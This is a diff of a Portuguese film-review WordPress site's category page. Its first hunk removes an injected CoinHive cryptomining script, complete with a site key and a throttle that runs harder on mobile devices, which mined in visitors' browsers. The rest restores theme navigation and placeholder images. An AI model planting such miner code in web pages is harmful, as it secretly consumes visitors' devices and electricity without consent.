@@ -81,12 +81,7 @@ var a2a_config=a2a_config||{};a2a_config.callbacks=a2a_config.callbacks||[];a2a_
   #nav-header .nav ul { background-color: #000000; }
 }
         #footer-bottom { background-color: #000000; }body { background-color: #eaeaea; }</style>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script><script>
-var speed = 0.17;
-if( window.matchMedia("only screen and (max-width: 760px)").matches ) {
-	speed = 0.8
-}
-var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:speed});setTimeout(function(){__m.start();},3000);</script></head>
+</head>
 
 <body class="archive category category-videos category-23 col-3cm full-width topbar-enabled header-desktop-sticky header-mobile-sticky unknown">
 
@@ -94,18 +89,70 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
   
   <header id="header" class="main-menu-mobile-on one-mobile-menu main_menu header-ads-desktop  topbar-transparent">
-        <!--/#nav-topbar-->  
-        <!--/#nav-topbar-->  
+        <nav class="nav-container group mobile-menu mobile-sticky" id="nav-mobile" data-menu-id="header-1">
+  <div class="mobile-title-logo-in-header">                  <p class="site-title"><a class="custom-logo-link" href="/" rel="home" title="Críticas | Home page">Críticas</a></p>
+                </div>
+        
+                    <!-- <div class="ham__navbar-toggler collapsed" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="ham-toggler-menu__span"></span>
+          </div>
+        </div> -->
+        <div class="ham__navbar-toggler-two collapsed" title="Menu" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="line line-1"></span>
+            <span class="line line-2"></span>
+            <span class="line line-3"></span>
+          </div>
+        </div>
+            
+      <div class="nav-text"></div>
+      <div class="nav-wrap container">
+                  <ul class="nav container-inner group mobile-search">
+                            <li>
+                  <form method="get" class="searchform themeform" action="http://criticas.centrodouniverso.com.br/">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form>                </li>
+                      </ul>
+                <ul id="menu-menu-principal" class="nav container-inner group"><li id="menu-item-755" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-755"><a href="/">Home</a></li>
+<li id="menu-item-2323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2323"><a href="/sobre">Sobre</a></li>
+<li id="menu-item-2271" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2271"><a href="/contato">Contato</a></li>
+</ul>      </div>
+</nav><!--/#nav-topbar-->  
+        <nav class="nav-container group desktop-menu desktop-sticky" id="nav-topbar" data-menu-id="header-2">
+    <div class="nav-text"></div>
+  <div class="topbar-toggle-down">
+    <i class="fa fa-angle-double-down" aria-hidden="true" data-toggle="down" title="Expand menu"></i>
+    <i class="fa fa-angle-double-up" aria-hidden="true" data-toggle="up" title="Collapse menu"></i>
+  </div>
+  <div class="nav-wrap container">
+    <ul class="nav container-inner group"><li ><a href="/">Home</a></li><li class="page_item page-item-2270"><a href="/contato">Contato</a></li><li class="page_item page-item-2322"><a href="/sobre">Sobre</a></li></ul>  </div>
+      <div id="topbar-header-search" class="container">
+      <div class="container-inner">
+        <div class="toggle-search"><i class="fa fa-search"></i></div>
+        <div class="search-expand">
+          <div class="search-expand-inner"><form method="get" class="searchform themeform" action="http://criticas.centrodouniverso.com.br/">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form></div>
+        </div>
+      </div><!--/.container-inner-->
+    </div><!--/.container-->
+  
+</nav><!--/#nav-topbar-->  
   <div class="container group">
         <div class="container-inner">
 
-                    <div class="group pad central-header-zone" style="background-image:url('/banner_criticas.png')">
+                    <div class="group pad central-header-zone">
                   <div class="logo-tagline-group">
                                         <p class="site-title"><a class="custom-logo-link" href="/" rel="home" title="Críticas | Home page">Críticas</a></p>
                                                                 <p class="site-description">Fique por dentro do que rola no mundo do cinema</p>
                                         </div>
 
-                                </div><img style='display:none' src='/banner_criticas.png'></img>
+                                </div>
       
                 <nav class="nav-container group desktop-menu" id="nav-header" data-menu-id="header-3">
     <div class="nav-text"><!-- put your mobile menu text here --></div>
@@ -139,18 +186,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7715" title="7 TRUQUES do cinema que você NÃO CONHECE! 😱 🔥">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed25b7d" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8b7c68" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed25b7d' ).animateSvg();
+                $( '#59bd5de8b7c68' ).animateSvg();
               });
-            } else { $( '#59bb7fed25b7d' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8b7c68' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="7 TRUQUES do cinema que você NÃO CONHECE! 😱 🔥" data-hu-post-id="59bb7fed25b7d" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="7 TRUQUES do cinema que você NÃO CONHECE! 😱 🔥" data-hu-post-id="59bd5de8b7c68" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -166,7 +213,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7715" rel="bookmark" title="7 TRUQUES do cinema que você NÃO CONHECE! 😱 🔥" target="_blank">7 TRUQUES do cinema que você NÃO CONHECE! 😱 🔥</a>
+			<a href="/archives/7715" rel="bookmark" title="7 TRUQUES do cinema que você NÃO CONHECE! 😱 🔥">7 TRUQUES do cinema que você NÃO CONHECE! 😱 🔥</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -179,18 +226,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7688" title="FEITO NA AMÉRICA (American Made, 2017) &#8211; Crítica">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed2d2ca" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8b963b" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed2d2ca' ).animateSvg();
+                $( '#59bd5de8b963b' ).animateSvg();
               });
-            } else { $( '#59bb7fed2d2ca' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8b963b' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="FEITO NA AMÉRICA (American Made, 2017) &#8211; Crítica" data-hu-post-id="59bb7fed2d2ca" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="FEITO NA AMÉRICA (American Made, 2017) &#8211; Crítica" data-hu-post-id="59bd5de8b963b" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -206,7 +253,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7688" rel="bookmark" title="FEITO NA AMÉRICA (American Made, 2017) &#8211; Crítica" target="_blank">FEITO NA AMÉRICA (American Made, 2017) &#8211; Crítica</a>
+			<a href="/archives/7688" rel="bookmark" title="FEITO NA AMÉRICA (American Made, 2017) &#8211; Crítica">FEITO NA AMÉRICA (American Made, 2017) &#8211; Crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -219,18 +266,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7689" title="O NOVO HELLBOY &#8211; Curiosidades &#8211; Nerd Rabugento">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed349ae" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8baf15" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed349ae' ).animateSvg();
+                $( '#59bd5de8baf15' ).animateSvg();
               });
-            } else { $( '#59bb7fed349ae' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8baf15' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="O NOVO HELLBOY &#8211; Curiosidades &#8211; Nerd Rabugento" data-hu-post-id="59bb7fed349ae" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="O NOVO HELLBOY &#8211; Curiosidades &#8211; Nerd Rabugento" data-hu-post-id="59bd5de8baf15" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -246,7 +293,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7689" rel="bookmark" title="O NOVO HELLBOY &#8211; Curiosidades &#8211; Nerd Rabugento" target="_blank">O NOVO HELLBOY &#8211; Curiosidades &#8211; Nerd Rabugento</a>
+			<a href="/archives/7689" rel="bookmark" title="O NOVO HELLBOY &#8211; Curiosidades &#8211; Nerd Rabugento">O NOVO HELLBOY &#8211; Curiosidades &#8211; Nerd Rabugento</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -259,18 +306,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7672" title="6 ADAPTAÇÕES ODIADAS pelos AUTORES! 😡 ❌">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed3b94a" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8bc6d2" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed3b94a' ).animateSvg();
+                $( '#59bd5de8bc6d2' ).animateSvg();
               });
-            } else { $( '#59bb7fed3b94a' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8bc6d2' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="6 ADAPTAÇÕES ODIADAS pelos AUTORES! 😡 ❌" data-hu-post-id="59bb7fed3b94a" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="6 ADAPTAÇÕES ODIADAS pelos AUTORES! 😡 ❌" data-hu-post-id="59bd5de8bc6d2" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -286,7 +333,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7672" rel="bookmark" title="6 ADAPTAÇÕES ODIADAS pelos AUTORES! 😡 ❌" target="_blank">6 ADAPTAÇÕES ODIADAS pelos AUTORES! 😡 ❌</a>
+			<a href="/archives/7672" rel="bookmark" title="6 ADAPTAÇÕES ODIADAS pelos AUTORES! 😡 ❌">6 ADAPTAÇÕES ODIADAS pelos AUTORES! 😡 ❌</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -299,18 +346,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7673" title="VOCÊ ACHA QUE FAZER STAR WARS É DIVERTIDO? &#8211; Curiosidades &#8211; Nerd Rabugento">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed42c60" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8be178" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed42c60' ).animateSvg();
+                $( '#59bd5de8be178' ).animateSvg();
               });
-            } else { $( '#59bb7fed42c60' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8be178' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="VOCÊ ACHA QUE FAZER STAR WARS É DIVERTIDO? &#8211; Curiosidades &#8211; Nerd Rabugento" data-hu-post-id="59bb7fed42c60" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="VOCÊ ACHA QUE FAZER STAR WARS É DIVERTIDO? &#8211; Curiosidades &#8211; Nerd Rabugento" data-hu-post-id="59bd5de8be178" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -326,7 +373,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7673" rel="bookmark" title="VOCÊ ACHA QUE FAZER STAR WARS É DIVERTIDO? &#8211; Curiosidades &#8211; Nerd Rabugento" target="_blank">VOCÊ ACHA QUE FAZER STAR WARS É DIVERTIDO? &#8211; Curiosidades &#8211; Nerd Rabugento</a>
+			<a href="/archives/7673" rel="bookmark" title="VOCÊ ACHA QUE FAZER STAR WARS É DIVERTIDO? &#8211; Curiosidades &#8211; Nerd Rabugento">VOCÊ ACHA QUE FAZER STAR WARS É DIVERTIDO? &#8211; Curiosidades &#8211; Nerd Rabugento</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -339,18 +386,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7655" title="Descarrego: not suitable for all advertisers!!!">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed49431" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8bf987" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed49431' ).animateSvg();
+                $( '#59bd5de8bf987' ).animateSvg();
               });
-            } else { $( '#59bb7fed49431' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8bf987' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Descarrego: not suitable for all advertisers!!!" data-hu-post-id="59bb7fed49431" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Descarrego: not suitable for all advertisers!!!" data-hu-post-id="59bd5de8bf987" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -366,7 +413,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7655" rel="bookmark" title="Descarrego: not suitable for all advertisers!!!" target="_blank">Descarrego: not suitable for all advertisers!!!</a>
+			<a href="/archives/7655" rel="bookmark" title="Descarrego: not suitable for all advertisers!!!">Descarrego: not suitable for all advertisers!!!</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -379,18 +426,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7654" title="UMA MULHER FANTÁSTICA (Una Mujer Fantástica, 2017) &#8211; Crítica CBN">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed4c3d6" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8c11c1" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed4c3d6' ).animateSvg();
+                $( '#59bd5de8c11c1' ).animateSvg();
               });
-            } else { $( '#59bb7fed4c3d6' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8c11c1' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="UMA MULHER FANTÁSTICA (Una Mujer Fantástica, 2017) &#8211; Crítica CBN" data-hu-post-id="59bb7fed4c3d6" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="UMA MULHER FANTÁSTICA (Una Mujer Fantástica, 2017) &#8211; Crítica CBN" data-hu-post-id="59bd5de8c11c1" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -406,7 +453,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
